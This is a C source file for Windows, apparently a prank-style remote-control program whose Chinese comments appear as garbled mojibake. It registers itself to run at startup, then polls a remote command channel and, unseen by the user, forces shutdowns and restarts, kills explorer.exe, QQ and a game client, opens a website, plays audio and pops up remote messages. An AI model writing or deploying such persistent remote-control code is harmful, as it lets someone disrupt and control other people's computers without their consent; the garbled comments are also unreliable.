#include<stdio.h>
#include<windows.h>
#include"itmojun.h"
//MessageBoxϵͳ�����Ĺ��ܣ�������Ϣ��Ĵ��ڡ�

#pragma comment(lib,"itmojun.lib")//AutoRun��GetPCCmd����
#pragma comment(lib,"winmm.lib")//mciSendString����
//���õ�ǰ����Ŀ¼�µ�itmojun.lib��ϵͳ���ļ�Ŀ¼�µ�winmm.lib���������ļ���

char g_caption[501];
char g_title[501];

DWORD WINAPI MsgBoxThr(LPVOID lpParam);

int main()
{
	char cmd[301];//��Ŵ�΢Ц�˽��յ���Ϣ
	AutoRun();//����������Ϊ�����Զ�����
	mciSendString("open bg.mp3 alias s",NULL,0,NULL);//��ָ�������ļ���ָ�������Ϊs
	while(1)
	{
		GetPCCmd("konakona",cmd);
		printf("%s\n",cmd);
		if(strstr(cmd,"�ػ�"))
		{
			WinExec("shutdown-s-0",0);
		}
		else if(strstr(cmd,"����"))
		{
			WinExec("shutdown -r-t 0",0);
		}
		else if(strstr(cmd,"����"))
		{

			static int kill_flag=1;
			if(kill_flag)//��ȥ����
				WinExec("taskkill /f /im explorer.exe",0);
			else//�ָ�����
				WinExec("C:\\Windows\\explorer.exe",1);
			kill_flag=!kill_flag;
		}
		else if(strstr(cmd,"����QQ"))
		{
			WinExec("taskkill /f /im qq.exe",0);//QQ
		}
		else if(strstr(cmd,"����Ӣ������"))
		{
			WinExec("taskkill /f /im client.exe",0);//Ӣ������
		}
		else if(strstr(cmd,"���"))
		{
			WinExec("explorer http://itmojun.com",1);//�򿪹��
		}
		else if(strstr(cmd,"���±�"))
		{
			WinExec("notepad",1);//�򿪼��±�
		}
		else if(strstr(cmd,"����"))
		{
			mciSendString("play s repeat",NULL,0,NULL);//�ظ���������
		}
		else if(strstr(cmd,"��ͣ"))
		{
			mciSendString("pause s",NULL,0,NULL);//��ͣ����
		}
		else if(strstr(cmd,"ֹͣ"))
		{
			mciSendString("close s",NULL,0,NULL);//��ͣ����
		}
		/*else if(strstr(cmd,"��ʾ"))
		{
			//MessageBox(NULL,"a","��ʾ�����",b=1);
			MessageBox(NULL,"������Ͳ�Ҫ��","��ʾ�����",0);
		}*/
//strncmp������strncmp(s1,s2,size);�Ƚ�s1,s2�ַ�����ǰsize���ַ�.
//strlen������strlen(s1);�����ַ�������.
//strtok�������и��ַ���
		else if(strncmp(cmd,"��ʾ",strlen("��ʾ"))==0)

		{
			char*caption=NULL;
			char*title=NULL;
			strtok(cmd,"#");
			caption=strtok(NULL,"#");
			title=strtok(NULL,"#");

			if(caption==NULL)
				strcpy(g_caption,"");
			else 
				strcpy(g_caption,caption);
			if(title==NULL)
				strcpy(g_title,"");
			else
				strcpy(g_title,title);

			//CreateThreadϵͳ�����Ĺ��ܣ�����һ�����߳�
			CreateThread(NULL,0,MsgBoxThr,NULL,0,NULL);
			
		}
	Sleep(3000);//��ֹ�ظ�����Ϣ���ӳ�3����ʾ��
	}
	return 0;
}

//�����̺߳���
DWORD WINAPI MsgBoxThr(LPVOID lpParam)
{
	MessageBox(NULL,g_caption,g_title,0);
	return 0;
}